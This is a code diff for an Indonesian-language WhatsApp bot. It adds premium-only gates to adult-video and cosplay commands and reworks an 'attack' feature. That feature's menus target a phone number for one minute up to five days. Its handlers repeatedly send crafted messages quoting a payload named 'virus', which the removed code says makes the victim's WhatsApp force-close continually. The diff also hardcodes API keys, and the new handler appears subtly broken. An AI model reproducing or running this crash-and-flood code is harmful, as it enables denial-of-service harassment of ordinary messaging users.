@@ -2756,6 +2756,7 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
             }
             break
             case 'hentai':{
+            	if (!isCreator && !isPremium) throw `Hanya Owner Dan User Premium Yang dapat mengakses Fitur ini`
             let anu = await fetchJson('https://zenzapis.xyz/downloader/hentaivid?apikey=satganzdevs')
             m.reply(mess.wait)
                 let buttons = [
@@ -2802,6 +2803,7 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
             }
             break
             case 'cosplay': {
+            	if (!isCreator && !isPremium) throw `Hanya Owner Dan User Premium Yang dapat mengakses Fitur ini`
             let buttons = [
                     {buttonId: `cosplay`, buttonText: {displayText: 'Next '}, type: 1}
                 ]
@@ -3992,7 +3994,8 @@ case 'carbon':{
 	}
 	break
 	case 'santed': case 'attack':{
-	    if (!isCreator && !isPremium) throw mess.premium
+	    if (!isCreator && !isPremium) throw `Premium Only`
+	    if (!text) throw `Mau Attack Siapa?`
 let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
 let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
 var satgnz = "6281316701742"
@@ -4006,11 +4009,33 @@ let isBot = isnobot.test(m.text)
  {
  let sections = [
                 {
-                title: "Attack Features",
+                title: "MENIT",
                 rows: [
-                {title: "1 Minute", rowId: `.atk1 ${noget}`, description: `Attack ${noget} During 1 Minute `},
-                {title: "1 Hours", rowId: `.atk3 ${noget}`, description: `Attack ${noget} During 1 Hours`},
-                {title: "1 Day", rowId: `.atk3 ${noget}`, description: `Attack ${noget} During 1 Day`}
+                {title: "1 Minute", rowId: `.atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
+                {title: "2 Minute", rowId: `.atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
+                {title: "3 Minute", rowId: `.atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
+                {title: "4 Minute", rowId: `.atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
+                {title: "5 Minute", rowId: `.atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
+                ]
+                },
+                {
+                title: "HOURS",
+                rows: [
+                {title: "1 Hours", rowId: `.atk ${noget}|11`, description: `Attack ${noget} During 1 Hours `},
+                {title: "2 Hours", rowId: `.atk ${noget}|12`, description: `Attack ${noget} During 2 Hours `},
+                {title: "3 Hours", rowId: `.atk ${noget}|13`, description: `Attack ${noget} During 3 Hours `},
+                {title: "4 Hours", rowId: `.atk ${noget}|14`, description: `Attack ${noget} During 4 Hours `},
+                {title: "5 Hours", rowId: `.atk ${noget}|15`, description: `Attack ${noget} During 5 Hours `}
+                ]
+                },
+                {
+                title: "DAY",
+                rows: [
+                {title: "1 Day", rowId: `.atk ${noget}|61`, description: `Attack ${noget} During 1 Day `},
+                {title: "2 Day", rowId: `.atk ${noget}|62`, description: `Attack ${noget} During 2 Day `},
+                {title: "3 Day", rowId: `.atk ${noget}|63`, description: `Attack ${noget} During 3 Day `},
+                {title: "4 Day", rowId: `.atk ${noget}|64`, description: `Attack ${noget} During 4 Day `},
+                {title: "5 Day", rowId: `.atk ${noget}|65`, description: `Attack ${noget} During 5 Day `}
                 ]
                 },
                 ]
@@ -4018,77 +4043,23 @@ let isBot = isnobot.test(m.text)
                 }
             }
             break
-		case 'atk1':{
-			if (!isCreator && isPremium) throw mess.premium
-let nomore = q
-serang(nomore)
-m.reply(`Sukses Attack ${nomore}, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 menit`)
-	}
-	break
-	case 'atk2':{
-		if (!isCreator && isPremium) throw mess.premium
-let nomore = q
-m.reply(`Sukses Attack ${nomore}, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 menit`)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-	}
-		break
-		case 'atk3':{
-			if (!isCreator && isPremium) throw mess.premium
-let nomore = q
-m.reply(`Sukses Attack ${nomore}, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 menit`)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-await sleep(300)
-serang(nomore)
-await sleep(600000)
-serang(nomore)
-	}
-		break
+		case 'atk':{
+		if (!text) throw m.reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
+let spar = text.split("|")[0]
+let terern = text.split("|")[1]
+var satgnz = "6281316701742"
+let isLinkThisGc = new RegExp(satgnz, 'i')
+let isgclink = isLinkThisGc.test(m.text)
+ if (isgclink) return m.reply(`You Can't Attack My Owner`)
+if (!terern) throw m.reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
+if (isNaN(terern)) throw m.reply(`Must be a number `)
+for (let i = 0; i < terern; i++){
+SatganzDevs.sendMessage(`${spar}@s.whatsapp.net`, { text: `p`, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": `https://wa.me/6281316701742`,"thumbnail": thumby,"sourceUrl": "hehe"}}}, { quoted: virus})
+}
+}
+let terern = text.split("|")[1]
+m.reply('Sukses Attack Wa Target Sebanyak/selama ${terern}')
+break
             default:
             if (budy.includes('pagi')) {
             let gomen = { url : "https://a.uguu.se/KXMnrOaN.mp3" }
